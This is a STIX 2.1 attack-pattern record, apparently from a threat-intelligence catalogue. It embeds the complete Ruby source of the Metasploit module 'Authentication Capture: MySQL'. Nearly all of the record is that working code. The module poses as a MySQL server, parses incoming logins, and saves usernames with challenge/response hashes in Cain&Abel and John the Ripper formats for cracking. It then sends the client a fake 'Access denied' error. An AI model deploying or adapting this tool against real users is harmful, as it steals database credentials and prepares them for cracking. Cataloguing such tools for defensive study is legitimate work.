{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9501a051-b582-448f-8df8-43291f895102",
    "created": "2024-08-14T16:22:00.818844Z",
    "modified": "2024-08-14T16:22:00.818849Z",
    "name": "Authentication Capture: MySQL",
    "description": " This module provides a fake MySQL service that is designed to capture authentication credentials. It captures\tchallenge and response pairs that can be supplied to Cain or JtR for cracking. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/server/capture/mysql.rb",
            "external_id": "mysql.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::TcpServer\n  include Msf::Auxiliary::Report\n\n  def initialize\n    super(\n      'Name'           => 'Authentication Capture: MySQL',\n      'Description'    => %q{\n        This module provides a fake MySQL service that is designed to\n        capture authentication credentials. It captures\tchallenge and\n        response pairs that can be supplied to Cain or JtR for cracking.\n      },\n      'Author'         => 'Patrik Karlsson <patrik[at]cqure.net>',\n      'License'        => MSF_LICENSE,\n      'Actions'        => [[ 'Capture', 'Description' => 'Run MySQL capture server' ]],\n      'PassiveActions' => [ 'Capture' ],\n      'DefaultAction'  => 'Capture'\n    )\n\n    register_options(\n      [\n        OptPort.new('SRVPORT', [ true, \"The local port to listen on.\", 3306 ]),\n        OptString.new('CHALLENGE', [ true, \"The 16 byte challenge\", \"112233445566778899AABBCCDDEEFF1122334455\" ]),\n        OptString.new('SRVVERSION', [ true, \"The server version to report in the greeting response\", \"5.5.16\" ]),\n        OptString.new('CAINPWFILE',  [ false, \"The local filename to store the hashes in Cain&Abel format\", nil ]),\n        OptString.new('JOHNPWFILE',  [ false, \"The prefix to the local filename to store the hashes in JOHN format\", nil ]),\n      ])\n  end\n\n  def setup\n    super\n    @state = {}\n  end\n\n  def run\n    if datastore['CHALLENGE'].to_s =~ /^([a-fA-F1-9]{40})$/\n      @challenge = [ datastore['CHALLENGE'] ].pack(\"H*\")\n    else\n      print_error(\"CHALLENGE syntax must match 112233445566778899AABBCCDDEEFF1122334455\")\n      return\n    end\n    @version = datastore['SRVVERSION']\n    exploit()\n  end\n\n  def on_client_connect(c)\n    @state[c] = {\n      :name    => \"#{c.peerhost}:#{c.peerport}\",\n      :ip      => c.peerhost,\n      :port    => c.peerport,\n    }\n    mysql_send_greeting(c)\n  end\n\n  def mysql_send_greeting(c)\n    # https://dev.mysql.com/doc/internals/en/connection-phase-packets.html\n\n    length = 68 + @version.length\n    packetno = 0\n    chall = String.new(@challenge)\n    data = [\n      ( length & 0x00FFFFFF ) + ( packetno << 24 ), # length + packet no\n      10, # protocol version: 10e\n      @version, # server version: 5.5.16 (unless changed)\n      rand(9999) + 1, # thread id\n      chall.slice!(0,8), # the first 8 bytes of the challenge\n      0x00, # filler\n      0xfff7, # server capabilities\n      0x21, # server language: UTF8\n      0x0002, # server status\n      \"0f801500000000000000000000\", # filler\n      chall.slice!(0,12),\n      \"mysql_native_password\"\n    ].pack(\"VCZ*VA*CnCvH*Z*Z*\")\n    c.put data\n  end\n\n  def mysql_process_login(data, info)\n    length = ( data.slice(0,4).unpack(\"V\")[0] & 0x00FFFFFF )\n    packetno = ( data.slice!(0,4).unpack(\"V\")[0] & 0xFF000000 ) >> 24\n    flags = data.slice!(0,2).unpack(\"v\")[0]\n    if ( flags & 0x8000 ) != 0x8000\n      info[:errors] << \"Unsupported protocol detected\"\n      return info\n    end\n\n    # we're dealing with the 4.1+ protocol\n    extflags = data.slice!(0,2).unpack(\"v\")[0]\n    maxpacket= data.slice!(0,4).unpack(\"N\")[0]\n    charset = data.slice!(0,1).unpack(\"C\")[0]\n\n    # slice away 23 bytes of filler\n    data.slice!(0,23)\n\n    info[:username] = data.slice!(0, data.index(\"\\x00\")+1).unpack(\"Z*\")[0]\n    response_len = data.slice!(0,1).unpack(\"C\")[0]\n    if response_len != 20\n      return\n    end\n    info[:response] = data.slice!(0, 20).unpack(\"A*\")[0]\n\n    if ( flags & 0x0008 ) == 0x0008\n      info[:database] = data.slice!(0, data.index(\"\\x00\")).unpack(\"A*\")[0]\n    end\n    info\n  end\n\n  def mysql_send_error(c, msg)\n    length = 9 + msg.length\n    packetno = 2\n    data = [\n      ( length & 0x00FFFFFF ) + ( packetno << 24 ), # length + packet no\n      0xFF, # field count, always: ff\n      1045, # error code\n      0x23, # sqlstate marker, always '#'\n      \"28000\", # sqlstate\n      msg\n    ].pack(\"VCvCA*A*\")\n    c.put data\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :nonreplayable_hash\n    }.merge(service_data)\n\n    login_data = {\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::UNTRIED,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def on_client_data(c)\n    info = { :errors => [] }\n    data = c.get_once\n    return if not data\n\n    mysql_process_login(data, info)\n    if info[:errors] and not info[:errors].empty?\n      print_error(\"#{@state[c][:name]} #{info[:errors].join(\"\\n\")}\")\n    elsif info[:username] and info[:response]\n      mysql_send_error(c, \"Access denied for user '#{info[:username]}'@'#{c.peerhost}' (using password: YES)\")\n      if info[:database]\n        print_good(\"#{@state[c][:name]} - User: #{info[:username]}; Challenge: #{@challenge.unpack('H*')[0]}; Response: #{info[:response].unpack('H*')[0]}; Database: #{info[:database]}\")\n      else\n        print_good(\"#{@state[c][:name]} - User: #{info[:username]}; Challenge: #{@challenge.unpack('H*')[0]}; Response: #{info[:response].unpack('H*')[0]}\")\n      end\n      hash_line = \"#{info[:username]}:$mysql$#{@challenge.unpack(\"H*\")[0]}$#{info[:response].unpack('H*')[0]}\"\n\n      report_cred(\n        ip: c.peerhost,\n        port: datastore['SRVPORT'],\n        service_name: 'mysql_client',\n        user: info[:username],\n        password: hash_line,\n        proof: info[:database] ? info[:database] : hash_line\n      )\n\n      if (datastore['CAINPWFILE'])\n        fd = ::File.open(datastore['CAINPWFILE'], \"ab\")\n        fd.puts(\n        [\n          info[:username],\n          \"NULL\",\n          info[:response].unpack('H*')[0],\n          @challenge.unpack('H*')[0],\n          \"SHA1\"\n        ].join(\"\\t\").gsub(/\\n/, \"\\\\n\")\n        )\n        fd.close\n      end\n\n      if(datastore['JOHNPWFILE'])\n        john_hash_line = \"#{info[:username]}:$mysqlna$#{@challenge.unpack(\"H*\")[0]}*#{info[:response].unpack('H*')[0]}\"\n        fd = ::File.open(datastore['JOHNPWFILE'] + '_mysqlna' , \"ab\")\n        fd.puts john_hash_line\n        fd.close\n      end\n    else\n      mysql_send_error(c, \"Access denied for user '#{info[:username]}'@'#{c.peerhost}' (using password: NO)\")\n    end\n    c.close\n  end\n\n  def on_client_close(c)\n    @state.delete(c)\n  end\nend\n"
}